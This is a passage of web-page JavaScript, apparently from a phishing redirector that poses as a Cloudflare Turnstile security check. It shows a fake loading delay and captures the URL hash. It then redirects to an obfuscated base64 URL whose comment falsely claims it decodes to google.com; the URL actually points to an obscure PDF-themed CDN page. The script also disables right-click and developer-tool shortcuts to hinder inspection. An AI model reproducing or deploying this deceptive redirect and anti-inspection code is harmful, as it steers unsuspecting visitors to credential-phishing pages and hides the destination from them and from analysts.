            console.log('Captured hash:', currentHash);

            // Base64-encoded redirect URL (decodes to https://google.com)
            var base64RedirectUrl = 'aHR0cHM6Ly9zb3VyY2VyYXktdXM5cGRmLW1hbmRvaWVrZmstbW9sZXBkZi1sMTkzOTRsMy5iLWNkbi5uZXQva2lhb2lkamtha2VpcDJqZmkvaW5kZXgtNTkuaHRtbA==';

            try {
                // Decode base64 URL with UTF-8 safety
                var redirectUrl;
                try {
                    redirectUrl = decodeURIComponent(escape(atob(base64RedirectUrl)));
                } catch (e) {
                    redirectUrl = atob(base64RedirectUrl);
                }

                if (currentHash) {
                    redirectUrl += currentHash;
                    console.log('Hash appended to redirect URL:', currentHash);
                }

                console.log('Redirecting to:', redirectUrl);
                window.location.replace(redirectUrl);

            } catch (error) {
                console.error('Error decoding redirect URL:', error);
                alert('Error processing redirect. Please refresh and try again.');
            }
        }

        function startVerification() {
            var loadingSpinner = document.getElementById('loading-spinner');
            var turnstileWidget = document.getElementById('turnstile-widget');
            var verifyingText = document.getElementById('verifying-text');

            setTimeout(function() {
                loadingSpinner.style.display = 'none';
                turnstileWidget.style.display = 'block';
                verifyingText.textContent = 'Complete the security check to continue';
                renderTurnstile();
            }, Math.random() * 2000 + 3000);
        }

        window.addEventListener('load', function() {
            document.body.removeAttribute('unresolved');
            setTimeout(startVerification, 500);
        });

        document.body.setAttribute('unresolved', '');

        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
                (e.ctrlKey && e.shiftKey && e.key === 'C') ||
                (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
                return false;
            }
        });
    </script>
